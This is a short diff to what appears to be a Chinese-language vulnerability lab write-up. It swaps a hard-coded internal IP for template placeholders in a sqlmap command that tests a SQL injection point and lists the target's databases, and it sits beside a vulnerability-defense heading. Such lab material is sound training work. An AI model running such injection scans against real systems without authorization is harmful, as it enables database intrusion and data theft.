@@ -21,7 +21,7 @@ ps:更多细节查阅参考资料
 ```
 git clone https://github.com/sqlmapproject/sqlmap
 cd sqlmap
-python sqlmap.py --batch -u "http://10.0.1.28:32806/getUserInfoOrder/name*" --dbs
+python sqlmap.py --batch -u "http://{{ip}}:{{port[0]}}/getUserInfoOrder/name*" --dbs
 ```
 
 ### 漏洞防御
